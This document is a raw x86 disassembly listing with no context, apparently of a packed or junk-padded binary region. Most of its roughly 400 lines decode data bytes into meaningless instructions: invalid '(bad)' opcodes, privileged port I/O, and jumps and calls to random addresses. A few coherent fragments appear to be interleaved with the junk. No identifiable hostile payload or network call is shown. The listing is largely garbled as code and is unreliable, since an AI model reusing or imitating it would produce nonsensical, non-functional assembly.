  41577f:	call   0x4886:0xf37d5a28
  415786:	mov    ah,0x96
  415788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415789:	je     0x41570c
  41578b:	test   DWORD PTR [edx+edi*2],esi
  41578e:	sub    eax,0xaf797443
  415793:	test   eax,0xcb349e68
  415798:	aas    
  415799:	mov    dh,BYTE PTR ds:0xe583d70d
  41579f:	xchg   BYTE PTR [edi+esi*2-0x4f],dl
  4157a3:	mov    al,0x27
  4157a5:	xor    BYTE PTR [ecx-0x38cade6b],cl
  4157ab:	mov    ah,0x85
  4157ad:	xlat   BYTE PTR ds:[ebx]
  4157ae:	and    BYTE PTR ds:0xd51b7ab,dl
  4157b4:	inc    ecx
  4157b5:	fmul   QWORD PTR [edx+esi*2-0x1d598eab]
  4157bc:	adc    bl,BYTE PTR [eax-0x684e9ab7]
  4157c2:	mov    ds:0xc4487813,al
  4157c7:	add    edi,ebp
  4157c9:	scas   eax,DWORD PTR es:[edi]
  4157ca:	add    al,0xc1
  4157cc:	bnd jnp 0x415766
  4157cf:	call   0x90e2fa68
  4157d4:	mov    cl,0xed
  4157d6:	cmc    
  4157d7:	call   0xd207c99c
  4157dc:	call   0x132639f
  4157e1:	fs imul edx,edx,0xffffffae
  4157e5:	popf   
  4157e6:	mov    bh,0x29
  4157e8:	int3   
  4157e9:	sub    BYTE PTR [ebp-0x1c],al
  4157ec:	stc    
  4157ed:	mov    edi,0x1f64e489
  4157f2:	repnz push ss
  4157f4:	repnz repz aad 0x26
  4157f8:	aad    0xee
  4157fa:	ror    BYTE PTR [edi],cl
  4157fc:	cmp    al,0x9f
  4157fe:	xor    BYTE PTR [edi],cl
  415800:	lods   al,BYTE PTR ds:[esi]
  415801:	rol    DWORD PTR [edx],1
  415803:	shr    edx,0x2
  415806:	xor    ecx,esi
  415808:	mov    edx,DWORD PTR [ebp+0x10]
  41580b:	mov    ebx,DWORD PTR [ebp+0x14]
  41580e:	xor    ebx,ebx
  415810:	or     ecx,ebx
  415812:	add    eax,ecx
  415814:	lea    eax,[ebp+eax*4-0x7c]
  415818:	jmp    0x415ba2
  41581d:	and    dl,bh
  41581f:	cmp    al,BYTE PTR [eax+0x60]
  415822:	and    BYTE PTR [eax],0x9a
  415825:	ins    BYTE PTR es:[edi],dx
  415826:	cmp    eax,0x45cdfb9f
  41582b:	push   ebx
  41582c:	inc    ebp
  41582d:	adc    eax,ecx
  41582f:	sar    DWORD PTR [ebx-0x44443a70],0x21
  415836:	loop   0x415860
  415838:	adc    DWORD PTR [edi+0x7e],ebx
  41583b:	ins    DWORD PTR es:[edi],dx
  41583c:	push   es
  41583d:	stc    
  41583e:	ror    BYTE PTR ds:0x63040499,1
  415844:	sbb    al,0x11
  415846:	xchg   esi,eax
  415847:	cdq    
  415848:	jecxz  0x4158b5
  41584a:	jne    0x415834
  41584c:	cmp    ebp,DWORD PTR [ecx-0x14]
  41584f:	popa   
  415850:	push   cs
  415851:	sbb    ebp,esi
  415853:	ficom  WORD PTR [ebx+0x6bdb01db]
  415859:	icebp  
  41585a:	in     eax,dx
  41585b:	pop    edi
  41585c:	data16 fs loop 0x4158c5
  415860:	jo     0x415829
  415862:	and    DWORD PTR [edx],ecx
  415864:	sti    
  415865:	(bad)  
  415866:	adc    BYTE PTR [eax],al
  415868:	hlt    
  415869:	push   esi
  41586a:	add    eax,0x51677473
  41586f:	dec    esp
  415870:	inc    esi
  415871:	mov    ebp,0xc7e1f6a0
  415876:	jle    0x4158ec
  415878:	mov    bh,0xff
  41587a:	push   ebx
  41587b:	in     al,dx
  41587c:	fcmovnbe st,st(5)
  41587e:	aaa    
  41587f:	jecxz  0x4158da
  415881:	push   0x671c83fe
  415886:	xchg   edx,eax
  415887:	add    ebx,0xffffffb8
  41588a:	mov    esp,0x1a385466
  415890:	inc    edi
  415891:	dec    eax
  415892:	push   eax
  415893:	dec    ebp
  415894:	es mov al,0x34
  415897:	(bad)  
  415898:	xchg   ebp,eax
  415899:	cmp    eax,0x10912d8a
  41589e:	mov    eax,0xc2db0d00
  4158a3:	mov    ?,eax
  4158a5:	add    DWORD PTR [edx],0x1f
  4158a8:	sub    edi,DWORD PTR gs:[ebx]
  4158ab:	mov    esp,DWORD PTR ds:0xd3d2988c
  4158b1:	fist   DWORD PTR [ebp+0x597e3b2e]
  4158b7:	adc    bh,BYTE PTR [esi-0x2412f631]
  4158bd:	cmp    al,0xdf
  4158bf:	pop    edx
  4158c0:	sahf   
  4158c1:	fcomi  st,st(0)
  4158c3:	push   eax
  4158c4:	aam    0xd0
  4158c6:	lea    edi,[eax-0x5305b80e]
  4158cc:	sbb    ecx,esi
  4158ce:	pop    ebp
  4158cf:	sub    dh,BYTE PTR [ecx-0x4043a214]
  4158d5:	pushw  0xffa1
  4158d8:	test   eax,0xd78a29dd
  4158dd:	jmp    0xe4ac:0xc6a9030
  4158e4:	mov    al,ds:0x94988f76
  4158e9:	mov    cs,ebp
  4158eb:	fild   QWORD PTR [esp+eax*4]
  4158ee:	push   0x62ae2767
  4158f3:	das    
  4158f4:	jmp    0x4158a7
  4158f6:	jnp    0x41592a
  4158f8:	dec    edi
  4158f9:	pop    ebx
  4158fa:	loopne 0x4158cf
  4158fc:	pminsw mm3,mm7
  4158ff:	pop    ebx
  415900:	dec    ebx
  415901:	pop    esi
  415902:	push   0xffffffec
  415904:	addr16 xchg esp,eax
  415906:	enter  0xd723,0x18
  41590a:	xchg   edx,eax
  41590b:	cs clc 
  41590d:	lods   eax,DWORD PTR ds:[esi]
  41590e:	mov    ebp,0xc5f0f58a
  415913:	pop    edi
  415914:	inc    edi
  415915:	and    DWORD PTR [esi-0x1956844],ecx
  41591b:	pop    es
  41591c:	xchg   ebp,eax
  41591d:	in     al,0xf9
  41591f:	and    DWORD PTR [edx*4+0x6b3c8af1],esp
  415926:	shr    BYTE PTR [eax+0x12],0xb8
  41592a:	jle    0x415948
  41592c:	pop    es
  41592d:	mov    fs,WORD PTR ds:0xbe28c86d
  415933:	cmp    DWORD PTR [eax+0x4e68f6ed],esi
  415939:	nop
  41593a:	rol    DWORD PTR [eax-0x75],cl
  41593d:	pop    es
  41593e:	popf   
  41593f:	in     eax,0xc
  415941:	pushf  
  415942:	sbb    eax,0x69484fa8
  415947:	scas   al,BYTE PTR es:[edi]
  415948:	mov    ecx,0xec87861d
  41594d:	push   cs
  41594e:	mov    ch,0x6e
  415950:	and    ecx,DWORD PTR [eax+edx*2]
  415953:	dec    esp
  415954:	ret    
  415955:	mov    bh,0x72
  415957:	xor    DWORD PTR [ebp+0x6a1acac9],esi
  41595d:	outs   dx,BYTE PTR ds:[esi]
  41595e:	mov    dh,0x6e
  415960:	ins    BYTE PTR es:[edi],dx
  415961:	mov    cl,0x34
  415963:	sub    eax,0x5de0d1cf
  415968:	test   DWORD PTR [eax-0xe],edi
  41596b:	adc    ebp,ebp
  41596d:	pop    eax
  41596e:	(bad)  
  41596f:	stc    
  415970:	mov    WORD PTR [eax],ss
  415972:	rol    BYTE PTR [eax+0x28fc6270],cl
  415978:	sbb    cl,BYTE PTR [edx+eiz*2]
  41597b:	lea    ebp,[edi]
  41597d:	cmp    dh,BYTE PTR [edx-0x7b]
  415980:	pop    es
  415981:	jle    0x4159b6
  415983:	ret    
  415984:	xchg   esp,eax
  415985:	aam    0xda
  415987:	sti    
  415988:	ret    
  415989:	mov    ebp,0xb8a789ca
  41598e:	lock sar BYTE PTR [edx+0x119fa29f],1
  415995:	aaa    
  415996:	xchg   ebp,eax
  415997:	fimul  DWORD PTR [edx+0x16]
  41599a:	fcmovnbe st,st(5)
  41599c:	mov    fs,WORD PTR [ebx-0x1f]
  41599f:	inc    ecx
  4159a0:	(bad)  
  4159a1:	xchg   ecx,eax
  4159a2:	xchg   ebp,eax
  4159a3:	adc    al,BYTE PTR [ebp-0x7d3891a]
  4159a9:	pop    esi
  4159aa:	and    al,al
  4159ac:	addr16 retf 0xc3e6
  4159b0:	lahf   
  4159b1:	adc    BYTE PTR [edx],al
  4159b3:	fdiv   DWORD PTR [ebp+0x7d]
  4159b6:	sbb    DWORD PTR [esi-0x15],esp
  4159b9:	mov    ah,0x72
  4159bb:	or     al,dl
  4159bd:	stos   DWORD PTR es:[edi],eax
  4159be:	(bad)  
  4159c0:	jns    0x415993
  4159c2:	push   ds
  4159c3:	or     ch,BYTE PTR ds:0xd9ca702e
  4159c9:	inc    eax
  4159ca:	lods   eax,DWORD PTR ds:[esi]
  4159cb:	sub    eax,0x5ef6596
  4159d0:	dec    esi
  4159d1:	cmp    al,0x8
  4159d3:	popa   
  4159d4:	inc    esp
  4159d5:	fistp  DWORD PTR [eax]
  4159d7:	mov    ch,0xdb
  4159d9:	clc    
  4159da:	in     al,dx
  4159db:	and    DWORD PTR [esi+0x19],edx
  4159de:	push   DWORD PTR [esi+0x4d01bfd5]
  4159e4:	cwd    
  4159e6:	xlat   BYTE PTR ds:[ebx]
  4159e7:	mov    cl,0x18
  4159e9:	rcr    BYTE PTR [esi+0x60c9f73],0x6b
  4159f0:	jmp    0x415a3d
  4159f2:	idiv   BYTE PTR [ecx]
  4159f4:	pop    ss
  4159f5:	mul    DWORD PTR [edi+0x7f]
  4159f8:	jp     0x415a02
  4159fa:	into   
  4159fb:	xor    bh,bl
  4159fd:	pusha  
  4159fe:	jns    0x415a18
  415a00:	dec    esi
  415a01:	add    bh,dh
  415a03:	sbb    eax,0xe0a74108
  415a08:	sub    al,0x66
  415a0a:	or     BYTE PTR [ecx],al
  415a0c:	js     0x415a46
  415a0e:	fsub   QWORD PTR [ecx-0x5a63b652]
  415a14:	jg     0x4159b4
  415a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a17:	push   eax
  415a18:	add    al,0x4e
  415a1a:	leave  
  415a1b:	xchg   dh,ah
  415a1d:	shr    DWORD PTR [edx],1
  415a1f:	in     al,dx
  415a20:	shr    DWORD PTR [ebx+0x3a],cl
  415a23:	loopne 0x415a97
  415a25:	inc    esp
  415a26:	clc    
  415a27:	rcr    DWORD PTR [ebx+ebp*8],0x7
  415a2b:	out    dx,al
  415a2c:	imul   ebx,DWORD PTR [eax+0x393ef764],0x1a
  415a33:	fidiv  WORD PTR [ebp-0x20bcd820]
  415a39:	cmp    bh,dh
  415a3b:	imul   ecx,DWORD PTR [edx+ecx*4+0x4e],0x861531b4
  415a43:	popf   
  415a44:	jae    0x4159ca
  415a46:	xor    al,0x7f
  415a48:	xchg   ebx,eax
  415a49:	leave  
  415a4a:	rcl    BYTE PTR [edx+0x6ab402ce],cl
  415a50:	into   
  415a51:	aad    0x82
  415a53:	ins    DWORD PTR es:[edi],dx
  415a54:	rcr    ecx,1
  415a56:	push   ecx
  415a57:	(bad)  
  415a58:	test   al,0xd8
  415a5a:	ds ins DWORD PTR es:[edi],dx
  415a5c:	fwait
  415a5d:	repz pusha 
  415a5f:	and    edx,DWORD PTR [ebp-0x186ccadd]
  415a65:	shl    BYTE PTR [ebx+eiz*4],1
  415a68:	mov    edi,0x6f22240c
  415a6d:	cwde   
  415a6e:	push   cs
  415a6f:	inc    edx
  415a70:	xor    esp,DWORD PTR [ecx+ebp*8]
  415a73:	(bad)  
  415a74:	pop    ss
  415a75:	push   es
  415a76:	mov    eax,ds:0x611ffeac
  415a7b:	inc    ecx
  415a7c:	and    al,0x65
  415a7e:	or     al,0xe6
  415a80:	mov    esp,0x2022e44d
  415a85:	or     DWORD PTR [ebp-0x1a2db8e0],edi
  415a8b:	test   al,0xf9
  415a8d:	fisubr WORD PTR [ebp+0x306f1d91]
  415a93:	or     edx,DWORD PTR [ebx+0x60]
  415a96:	popf   
  415a97:	mov    bh,0x30
  415a99:	inc    edi
  415a9a:	push   eax
  415a9b:	mov    eax,ds:0xeccbac23
  415aa0:	cdq    
  415aa1:	fs xor eax,0xc85cd210
  415aa7:	test   eax,0xc28b9c37
  415aac:	pop    ds
  415aad:	out    dx,eax
  415aae:	outs   dx,DWORD PTR ds:[esi]
  415aaf:	(bad)  
  415ab0:	mov    ch,0xa4
  415ab2:	nop
  415ab3:	mov    dh,0x7d
  415ab5:	aam    0x37
  415ab7:	lock jmp 0x8f35c12e
  415abd:	jecxz  0x415a64
  415abf:	push   0x1a160121
  415ac4:	loopne 0x415abf
  415ac6:	or     BYTE PTR [edx],ch
  415ac8:	fcomp  QWORD PTR [edx]
  415aca:	push   ebx
  415acb:	ror    BYTE PTR [ecx+eiz*8],0xff
  415acf:	test   BYTE PTR [eax+0x7a],bl
  415ad2:	popa   
  415ad3:	jo     0x415b1d
  415ad5:	stos   BYTE PTR es:[edi],al
  415ad6:	fcmovbe st,st(3)
  415ad8:	cmp    al,0x74
  415ada:	xor    al,0xbc
  415adc:	imul   ecx,DWORD PTR [eax-0x50],0xd3a55b9
  415ae3:	or     DWORD PTR [edi+0x54b3ff46],edi
  415ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aea:	arpl   bx,ax
  415aec:	xor    eax,0xd5a93f06
  415af1:	mov    ecx,0x739779f
  415af6:	xor    BYTE PTR [ebx],bl
  415af8:	push   ebp
  415af9:	adc    edi,DWORD PTR [edx]
  415afb:	pop    esp
  415afc:	cmc    
  415afd:	xor    BYTE PTR [esp+ebx*4+0x75df727c],ch
  415b04:	push   ds
  415b05:	test   esp,eax
  415b07:	cmp    eax,0x7529b72d
  415b0c:	addr16 mov al,ds:0x20
  415b10:	inc    esi
  415b11:	adc    eax,DWORD PTR ds:0x7a3450bc
  415b17:	jne    0x415b09
  415b19:	pushf  
  415b1a:	cli    
  415b1b:	mov    eax,ds:0x8c8664d2
  415b20:	or     BYTE PTR [ecx+0x5e108434],al
  415b26:	sub    dh,BYTE PTR [eax]
  415b28:	cmp    ah,BYTE PTR [esi-0x19464581]
  415b2e:	aad    0x19
  415b30:	xchg   edx,eax
  415b31:	loop   0x415b09
  415b33:	out    dx,al
  415b34:	cmp    dh,BYTE PTR [esi+0x7fdfdda4]
  415b3a:	add    DWORD PTR [edi+0x50],edx
  415b3d:	add    al,0xf
  415b3f:	in     eax,0x41
  415b41:	push   0xffffffac
  415b43:	xchg   ebx,eax
  415b44:	mov    bh,0xbf
  415b46:	or     dl,0x76
  415b49:	inc    eax
  415b4a:	jp     0x415b3a
  415b4c:	sub    eax,0x50882a00
  415b51:	stos   DWORD PTR es:[edi],eax
  415b52:	sub    eax,0x6f32c3c0
  415b57:	push   0x13ef1bf2
  415b5c:	pop    ebx
  415b5d:	popf   
  415b5e:	mov    edx,DWORD PTR [ecx-0x60bd3c70]
  415b64:	repnz test ch,ah
  415b67:	shl    BYTE PTR [ebp+0xb68c255],1
  415b6d:	ins    DWORD PTR es:[edi],dx
  415b6e:	mov    bh,0xa6
  415b70:	out    0x48,al
  415b72:	mov    bh,0x57
  415b74:	fistp  QWORD PTR [eax+ebp*4+0x4b]
  415b78:	xor    ebx,eax
  415b7a:	ins    DWORD PTR es:[edi],dx
  415b7b:	push   edi
  415b7c:	add    al,0xa6
  415b7e:	cld    
  415b7f:	sub    esp,DWORD PTR [ebx+0x62]
  415b82:	addr16 xchg edx,eax
  415b84:	dec    eax
  415b85:	pop    esp
  415b86:	xchg   edi,eax
  415b87:	or     BYTE PTR [ecx],cl
  415b89:	or     ah,al
  415b8b:	xor    DWORD PTR [edi],0x9bdce7ed
  415b91:	popf   
  415b92:	fsubr  st(3),st
  415b94:	mov    ebp,DWORD PTR [eax+ecx*2+0x66aa0518]
  415b9b:	push   eax
  415b9c:	or     al,0xf
  415b9e:	adc    BYTE PTR [ebx+0x34],al
  415ba1:	sub    eax,0x1ee2c150
  415ba6:	call   0x41182a
  415bab:	mov    eax,DWORD PTR [ebp-0x80]
  415bae:	mov    ecx,DWORD PTR [ebp-0x80]
  415bb1:	xor    eax,edi
  415bb3:	xor    ecx,0xfffffffe
  415bb6:	shr    eax,0x2
  415bb9:	shl    ecx,0x1e
  415bbc:	or     ecx,eax
  415bbe:	mov    DWORD PTR [ebp-0x80],ecx
  415bc1:	lea    eax,[ebp-0x80]
  415bc4:	push   eax
  415bc5:	mov    eax,DWORD PTR [ebp+0x10]
  415bc8:	mov    ecx,DWORD PTR [ebp+0x14]
  415bcb:	shrd   eax,ecx,0x2
  415bcf:	shr    ecx,0x2
  415bd2:	mov    ecx,DWORD PTR [ebp+0x10]
  415bd5:	mov    edx,DWORD PTR [ebp+0x14]
  415bd8:	xor    eax,esi
  415bda:	xor    edx,edx
  415bdc:	jmp    0x415f66
  415be1:	fbld   TBYTE PTR [edi-0x43668328]
  415be7:	pop    edi
  415be8:	mov    ebp,0x713b3fa3
  415bed:	(bad)  
  415bee:	iret   
  415bef:	out    0x6f,al
  415bf1:	jmp    0x90fd1dbf
  415bf6:	lds    edi,FWORD PTR [ebx+0x762520bb]
  415bfc:	push   ebx
  415bfd:	(bad)  
  415bfe:	mov    dh,0xf3
  415c00:	ds push ebp
  415c02:	pop    ecx
  415c03:	ins    DWORD PTR es:[edi],dx
  415c04:	or     BYTE PTR [edx],bl
  415c06:	adc    BYTE PTR [esp+eiz*4],dl
  415c09:	ins    DWORD PTR es:[edi],dx
  415c0a:	nop
  415c0b:	les    ebp,FWORD PTR [ebx-0x571d591]
  415c11:	add    DWORD PTR [edi-0x63],edi
  415c14:	add    al,0x20
  415c16:	js     0x415bc0
  415c18:	dec    esi
  415c19:	cld    
  415c1a:	and    al,BYTE PTR [ecx]
  415c1c:	mov    eax,ds:0x4898ead3
  415c21:	into   
  415c22:	mov    ecx,0xcf1e7f1
  415c27:	mov    edx,0xdb6aa8cd
  415c2c:	mov    esp,0x41e55b8e
  415c31:	shr    BYTE PTR [esi+0x59],0x8f
  415c35:	dec    ebx
  415c36:	fisubr WORD PTR [ebx+eax*2]
  415c39:	clc    
  415c3a:	fld    TBYTE PTR [edx-0x704be8cd]
  415c40:	mov    eax,0xc2bc5ea4
  415c45:	push   0x85e730d6
  415c4a:	push   0xe453c577
  415c4f:	mov    ecx,0x48e628ff
  415c54:	and    dl,ch
  415c56:	out    0xc6,eax
  415c58:	jnp    0x415c32
  415c5a:	sbb    al,0xe2
  415c5c:	pop    es
  415c5d:	pop    ds
  415c5e:	cmc    
  415c5f:	out    0x92,eax
  415c61:	imul   eax,DWORD PTR [esi+0x4d15328e],0xffffffc2
  415c68:	cmp    DWORD PTR [ebx],ebp
  415c6a:	cld    
  415c6b:	mov    ebx,0x74e22d84
  415c70:	push   cs
  415c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c72:	push   0xffffffc9
  415c74:	jae    0x415cf0
  415c76:	cmp    esi,DWORD PTR [ecx+ebx*8]
  415c79:	mov    edi,0xb1f72d8b
  415c7e:	shl    bl,cl
  415c80:	pop    edx
  415c81:	adc    ebx,ecx
  415c83:	sti    
  415c84:	out    0x43,al
  415c86:	sahf   
  415c87:	adc    BYTE PTR [ebp+0x6e9de27e],0x69
  415c8e:	scas   al,BYTE PTR es:[edi]
  415c8f:	lock jne 0x415c4a
  415c92:	aam    0x66
  415c94:	lea    edx,[ebx+0x30]
  415c97:	xor    BYTE PTR [ebx+0xa],dh
  415c9a:	mov    es,WORD PTR [ecx-0x56135689]
  415ca0:	ret    0x29dd
  415ca3:	lods   al,BYTE PTR ds:[esi]
  415ca4:	test   al,0x33
  415ca6:	xchg   esp,eax
  415ca7:	push   eax
  415ca8:	in     al,0xd5
  415caa:	out    dx,eax
  415cab:	or     BYTE PTR [ebp-0x32],ch
  415cae:	sub    bh,BYTE PTR [eax]
  415cb0:	mov    edx,0xb0bf503c
  415cb5:	pusha  
  415cb6:	and    al,0x40
  415cb8:	push   ebp
  415cb9:	fiadd  WORD PTR [eax+0x31]
  415cbc:	add    DWORD PTR [ecx-0x34],0xf7a452b0
  415cc3:	cs je  0x415cca
  415cc6:	add    bh,bh
  415cc8:	mov    esp,0xb6b4318e
  415ccd:	data16 fld QWORD PTR [ecx+0x6ac18ceb]
  415cd4:	es retf 0xba6e
  415cd8:	add    ch,BYTE PTR [eax+0x35]
  415cdb:	mul    esi
  415cdd:	or     al,0x7b
  415cdf:	push   cs
  415ce0:	pop    ebx
  415ce1:	ins    DWORD PTR es:[edi],dx
  415ce2:	fist   DWORD PTR [edi]
  415ce4:	ja     0x415c7c
  415ce6:	mov    dl,0x4a
  415ce8:	inc    edx
  415ce9:	int    0x81
  415ceb:	and    eax,0xabb10df6
  415cf0:	pushf  
  415cf1:	outs   dx,BYTE PTR ds:[esi]
  415cf2:	jno    0x415d6c
  415cf4:	mov    dh,0x28
  415cf6:	gs push 0xa9348648
  415cfc:	pop    esp
  415cfd:	fstp   QWORD PTR [ebx+0x460b536c]
  415d03:	push   esi
  415d04:	shr    BYTE PTR [eax],0x1e
  415d07:	fstp   QWORD PTR [ebx+0x25]
  415d0a:	repnz push es
  415d0c:	inc    eax
  415d0d:	pop    ecx
  415d0e:	mov    eax,ds:0xe2f7ff88
  415d13:	(bad)  
  415d14:	sbb    eax,0xd8fac94a
  415d19:	cmp    BYTE PTR ds:[esi],bl
  415d1c:	imul   edx,DWORD PTR [edx-0xac6183e],0x4af2e02c
  415d26:	or     eax,ecx
  415d28:	and    BYTE PTR [edi+0x11f6e365],cl
  415d2e:	dec    edx
  415d2f:	stos   BYTE PTR es:[edi],al
  415d30:	jo     0x415d0a
  415d32:	dec    ebx
  415d33:	outs   dx,DWORD PTR ds:[esi]
  415d34:	cmp    BYTE PTR [eax+ecx*4+0x4d],al
  415d38:	(bad)  
  415d39:	cmp    al,0x1a
  415d3b:	adc    eax,0xa59a3a03
  415d40:	sahf   
  415d41:	and    dl,BYTE PTR [ebx+0x57]
  415d44:	xchg   ebp,eax
  415d45:	pushf  
  415d46:	mov    edx,0x454c17a4
  415d4b:	cmp    al,0x22
  415d4d:	sbb    al,BYTE PTR [edi-0x17]
  415d50:	stos   BYTE PTR es:[edi],al
  415d51:	retw   0xf9bb
  415d55:	retf   
  415d56:	lds    ecx,FWORD PTR cs:[eax+0x2d9962cd]
  415d5d:	push   ss
  415d5e:	mov    ch,BYTE PTR [edx+0x3c]
  415d61:	inc    eax
  415d62:	cmp    eax,DWORD PTR [ebx+0x357c3039]
  415d68:	push   cs
  415d69:	xchg   ecx,eax
  415d6a:	std    
  415d6b:	lods   al,BYTE PTR ds:[esi]
  415d6c:	mov    es,WORD PTR [ecx-0x4f]
  415d6f:	or     al,0xab
  415d71:	mov    ecx,DWORD PTR ds:0xc1b766e7
  415d77:	sbb    ebx,DWORD PTR [ebx]
  415d79:	adc    BYTE PTR [ebx+0x40],ah
  415d7c:	icebp  
  415d7d:	ins    BYTE PTR es:[edi],dx
  415d7e:	loop   0x415d0d
  415d80:	stos   BYTE PTR es:[edi],al
  415d81:	push   esi
  415d82:	js     0x415d9b
  415d84:	or     ebp,esi
  415d86:	jle    0x415db6
  415d88:	mov    al,ds:0x93673de6
  415d8d:	aas    
  415d8e:	fldenv [ebp-0x1f373ad5]
  415d94:	push   cs
  415d95:	cmp    al,0xac
  415d97:	pextrw esp,(bad),0xc5
  415d99:	bound  edx,QWORD PTR [eax]
  415d9b:	and    ecx,edx
  415d9d:	clc    
  415d9e:	not    BYTE PTR [ebx+0x58]
  415da1:	or     al,0xe2
  415da3:	in     al,dx
  415da4:	mov    ecx,0x6c83ea14
  415da9:	push   edi
  415daa:	pushf  
  415dab:	jo     0x415e0d
  415dad:	dec    ebp
  415dae:	inc    ecx
  415daf:	(bad)  
  415db0:	xor    eax,0x3e79e6e1
  415db5:	sti    
  415db6:	mov    eax,0xb25dde5b
  415dbb:	pop    eax
  415dbc:	cmp    eax,DWORD PTR [edx+ebp*2-0x80]
  415dc0:	mov    WORD PTR [eax-0x4f1e05f2],gs
  415dc6:	cmp    edi,DWORD PTR [edx+ecx*1+0x68]
  415dca:	sbb    al,0x89
  415dcc:	or     DWORD PTR [edx+0xe],0xffffffab
  415dd0:	xor    DWORD PTR [esi+0x77],esi
  415dd3:	jmp    0x415d76
  415dd5:	or     esi,0xdf0d769f
  415ddb:	adc    DWORD PTR [ebx+0x3f],ebx
  415dde:	das    
  415ddf:	retf   
  415de0:	pop    edx
  415de1:	inc    edi
  415de2:	xor    al,0xe0
  415de4:	in     eax,0xe9
  415de6:	xchg   edx,eax
  415de7:	cmp    edi,DWORD PTR ds:0x6908907e
  415ded:	xor    DWORD PTR [ebx+0x5d988861],0xe
  415df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df5:	iret   
  415df6:	or     BYTE PTR [eax-0x5e],cl
  415df9:	inc    ebx
  415dfa:	jg     0x415dd4
  415dfc:	push   eax
  415dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dfe:	or     eax,0xd56e62de
  415e03:	fnstsw WORD PTR [esi-0x6e]
  415e06:	fadd   st,st(0)
  415e08:	dec    ebx
  415e09:	arpl   dx,bp
  415e0b:	sub    al,0x4f
  415e0d:	aaa    
  415e0e:	jmp    0xcd82bae
  415e13:	pop    eax
  415e14:	adc    BYTE PTR [edx+edx*2],dl
  415e17:	ja     0x415e7a
  415e19:	mov    ecx,0x81d0e33c
  415e1e:	mov    dl,0x2e
  415e20:	ds pop edx
  415e22:	shr    BYTE PTR [ebx+0x4f1bda3a],1
  415e28:	or     edx,DWORD PTR [esi]
  415e2a:	(bad)  
  415e2b:	retf   0xf09
  415e2e:	addr16 jae 0x415dc4
  415e31:	mov    edx,0x5433f726
  415e36:	outs   dx,BYTE PTR ds:[esi]
  415e37:	or     al,0x23
  415e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e3a:	outs   dx,BYTE PTR ds:[esi]
  415e3b:	push   ds
  415e3c:	loope  0x415e67
  415e3e:	push   edi
  415e3f:	loopne 0x415e26
  415e41:	pusha  
  415e42:	iret   
  415e43:	fidiv  WORD PTR [ecx-0x3b]
  415e46:	outs   dx,DWORD PTR ds:[esi]
  415e47:	loop   0x415ded
  415e49:	aam    0xf5
  415e4b:	or     al,0xb9
  415e4d:	inc    DWORD PTR [edx+0x250083fe]
  415e53:	cmp    bl,BYTE PTR [ebx+0x25]
  415e56:	add    bh,BYTE PTR [ebp+0x3f4ca0ff]
  415e5c:	sub    ebx,DWORD PTR [ecx+ebx*8]
  415e5f:	test   BYTE PTR [eax],dl
  415e61:	add    eax,0x26643199
  415e66:	xchg   edi,eax
  415e67:	sub    eax,0x9fee091d
  415e6c:	data16 jne 0x415e3c
  415e6f:	ret    
  415e70:	jmp    0xd560014c
  415e75:	push   ebp
  415e76:	cmp    ah,BYTE PTR gs:[eax-0x2ae61cf9]
  415e7d:	dec    ecx
  415e7e:	jae    0x415edc
  415e80:	ss adc al,0x23
  415e83:	xor    ah,ah
  415e85:	in     al,0x4c
  415e87:	inc    ebx
  415e88:	adc    DWORD PTR [edi-0x1801a021],ebx
  415e8e:	pop    edi
  415e8f:	das    
  415e90:	and    ebx,DWORD PTR [eax+0x29e9518b]
  415e96:	js     0x415f0f
  415e98:	pushf  
  415e99:	outs   dx,BYTE PTR ds:[esi]
  415e9a:	mov    bh,0x6a
  415e9c:	pop    ebx
  415e9d:	clc    
  415e9e:	mov    dh,dl
  415ea0:	sub    DWORD PTR [eax],esi
  415ea2:	xchg   edx,eax
  415ea3:	sbb    dl,BYTE PTR [edi-0x76]
  415ea6:	stos   DWORD PTR es:[edi],eax
  415ea7:	xchg   BYTE PTR [eax+0x4eb29fe5],dl
  415ead:	or     edx,DWORD PTR [eax+0xb]
  415eb0:	(bad)  
  415eb1:	cs gs dec ecx
  415eb4:	sbb    DWORD PTR [ecx],0x41
  415eb7:	xchg   ecx,eax
  415eb8:	sbb    bh,BYTE PTR [eax+0x22]
  415ebb:	sbb    DWORD PTR [ecx-0x6d],eax
  415ebe:	mov    esp,0x44d75a3e
  415ec3:	pop    es
  415ec4:	(bad)  
  415ec5:	fnsave [esp+edx*4]
  415ec8:	div    DWORD PTR [ebp+0x3d650d12]
  415ece:	sbb    DWORD PTR [esi+0x10],ebp
  415ed1:	lods   eax,DWORD PTR ds:[esi]
  415ed2:	cmc    
  415ed3:	sar    DWORD PTR [ebx-0x39],1
  415ed6:	xor    DWORD PTR [eax],edi
  415ed8:	std    
  415ed9:	and    eax,DWORD PTR [edi]
  415edb:	mov    eax,ds:0xd858ae1b
  415ee0:	scas   eax,DWORD PTR es:[edi]
  415ee1:	sbb    BYTE PTR [ecx+0x3eeb0916],al
  415ee7:	pop    edi
  415ee8:	jmp    0xd1774917
  415eed:	inc    edi
  415eee:	xchg   esp,eax
  415eef:	lea    esp,[edx-0x1f]
  415ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ef3:	mov    DWORD PTR [eax],esp
  415ef5:	pop    edi
  415ef6:	pop    edi
  415ef7:	xor    al,0x60
  415ef9:	push   edx
  415efa:	neg    ch
  415efc:	inc    eax
  415efd:	out    0xb7,al
  415eff:	jp     0x415f6a
  415f01:	inc    esp
  415f02:	inc    ecx
  415f03:	push   cs
  415f04:	daa    
  415f05:	adc    DWORD PTR [ebx+0x1e864b0f],esp
  415f0b:	repnz inc ecx
  415f0d:	ins    BYTE PTR es:[edi],dx
  415f0e:	icebp  
  415f0f:	test   BYTE PTR [edi+eiz*2-0x773d1d02],dh
  415f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f17:	ss sahf 
  415f19:	enter  0x6e0c,0x58
  415f1d:	mov    eax,0xf7a4f621
  415f22:	rol    DWORD PTR [ebp-0x63],0x52
  415f26:	jmp    0x32b0:0x5e4697fd
  415f2d:	xor    al,0xa1
  415f2f:	aas    
  415f30:	fucom  st(3)
  415f32:	jmp    0x415f7c
  415f34:	adc    DWORD PTR ds:0xaf2a5b24,0xffffff9d
  415f3b:	fs sahf 
